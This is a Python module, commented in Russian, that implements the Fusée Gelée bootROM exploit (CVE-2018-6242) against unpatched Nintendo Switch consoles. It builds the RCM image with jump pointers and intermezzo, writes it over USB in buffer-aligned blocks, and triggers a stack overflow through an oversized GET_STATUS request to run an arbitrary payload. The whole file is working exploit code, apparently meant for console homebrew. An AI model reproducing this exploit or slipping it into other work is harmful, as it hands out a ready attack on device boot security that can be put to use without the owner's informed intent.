"""Отправка payload на Switch через fusée gelée (CVE-2018-6242).

Принципы:
- payload исполняется ТОЛЬКО в RAM (0x40010000), eMMC не затрагивается;
- требуется незалоченная erista (patched/mariko не примут эксплойт).

Протокол по fusee-launcher (сверено с исходником 2026-11-20):
1. чтение Device ID (16 байт, EP 0x81) — bootROM переходит в режим приёма;
2. образ: [длина команды 0x30298][пад до 680][указатели 0x4001F000 до
   INTERMEZZO_LOCATION][intermezzo][пад до 0x40020000][payload][пад до 0x1000];
3. запись блоками по 0x1000 на EP 0x01 (bootROM чередует DMA-буферы);
4. при необходимости переход на верхний буфер (лишний блок нулей);
5. триггер: control-IN GET_STATUS (0x82) длиной 0x7000 — переполнение стека
   bootROM, переход на intermezzo → payload. Срыв USB-соединения после
   триггера — НОРМА (признак успеха); если control-чтение вернулось —
   консоль эксплойт не приняла.
"""

from __future__ import annotations

from pathlib import Path

import usb1

from . import rcm
from .intermezzo import INTERMEZZO_BIN

RCM_PAYLOAD_ADDR = 0x40010000
INTERMEZZO_LOCATION = 0x4001F000
PAYLOAD_LOAD_BLOCK = 0x40020000
MAX_COMMAND_LENGTH = 0x30298
PACKET_SIZE = 0x1000
STACK_END = 0x40010000
COPY_BUFFER_ADDRESSES = (0x40005000, 0x40009000)

ENDPOINT_OUT = 0x01
ENDPOINT_IN = 0x81
TIMEOUT_MS = 1000


class PayloadError(RuntimeError):
    """Ошибка подготовки/отправки payload."""


def build_image(payload: bytes, intermezzo: bytes) -> bytes:
    """Собрать RCM-образ по схеме fusee-launcher.

    Первые 680 байт — заголовок команды; далее зона указателей перехода
    (каждое слово = INTERMEZZO_LOCATION) до самого intermezzo; затем паддинг
    до PAYLOAD_LOAD_BLOCK, payload и выравнивание до размера пакета.
    """
    header = MAX_COMMAND_LENGTH.to_bytes(4, "little")
    header += b"\x00" * (680 - len(header))
    repeat = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDR) // 4
    image = header + INTERMEZZO_LOCATION.to_bytes(4, "little") * repeat
    image += intermezzo
    # Смещение в образе = 680 + (адрес - RCM_PAYLOAD_ADDR): header не копируется
    # в IRAM. Паддинг — до адреса PAYLOAD_LOAD_BLOCK.
    target_len = 680 + (PAYLOAD_LOAD_BLOCK - RCM_PAYLOAD_ADDR)
    pad = target_len - len(image)
    if pad < 0:
        raise PayloadError("intermezzo больше 0x1000 байт")
    image += b"\x00" * pad
    image += payload
    remainder = len(image) % PACKET_SIZE
    if remainder:
        image += b"\x00" * (PACKET_SIZE - remainder)
    return image


class RcmLink:
    """Сессия связи с bootROM; обёрнута для лёгкой подмены в тестах."""

    def __init__(self, handle, ctx=None) -> None:
        self._handle = handle
        self._ctx = ctx
        self._buffer = 0  # bootROM начинает приём в верхний буфер (как в fusee)

    def close(self) -> None:
        if self._ctx is not None:
            self._ctx.close()
            self._ctx = None

    def read_device_id(self) -> bytes:
        return bytes(self._handle.bulkRead(ENDPOINT_IN, 16, TIMEOUT_MS))

    def write(self, data: bytes) -> None:
        for offset in range(0, len(data), PACKET_SIZE):
            self._write_single(data[offset : offset + PACKET_SIZE])

    def _write_single(self, chunk: bytes) -> None:
        self._buffer = 1 - self._buffer  # как write_single_buffer в fusee
        self._handle.bulkWrite(ENDPOINT_OUT, bytes(chunk), TIMEOUT_MS)

    def current_buffer_address(self) -> int:
        return COPY_BUFFER_ADDRESSES[self._buffer]

    def switch_to_highbuf(self) -> None:
        if self.current_buffer_address() != COPY_BUFFER_ADDRESSES[1]:
            self.write(b"\x00" * PACKET_SIZE)

    def trigger_smash(self) -> bool:
        """ Oversized GET_STATUS: разрыв связи = payload запущен. """
        length = STACK_END - self.current_buffer_address()
        try:
            self._handle.controlRead(0x82, 0x00, 0, 0, length, TIMEOUT_MS)
        except Exception:  # noqa: BLE001 — срыв USB после смэша и есть успех
            return True
        return False


def open_link() -> RcmLink:
    """Найти консоль в RCM и вернуть сессию (не забыть close())."""
    ctx, handle = rcm.open_handle()
    return RcmLink(handle, ctx)


def send_payload(
    link: RcmLink, payload: bytes, intermezzo: bytes = INTERMEZZO_BIN
) -> bool:
    """Отправить payload. True — консоль перешла на payload."""
    link.read_device_id()  # обязательный вход в режим приёма команд
    image = build_image(payload, intermezzo)
    link.write(image)
    link.switch_to_highbuf()
    return link.trigger_smash()


def launch_from_file(path: str | Path) -> bool:
    """Прочитать payload из файла и запустить на консоли."""
    payload_bytes = Path(path).read_bytes()
    if not payload_bytes:
        raise PayloadError("payload file is empty")
    link = open_link()
    try:
        return send_payload(link, payload_bytes)
    finally:
        link.close()
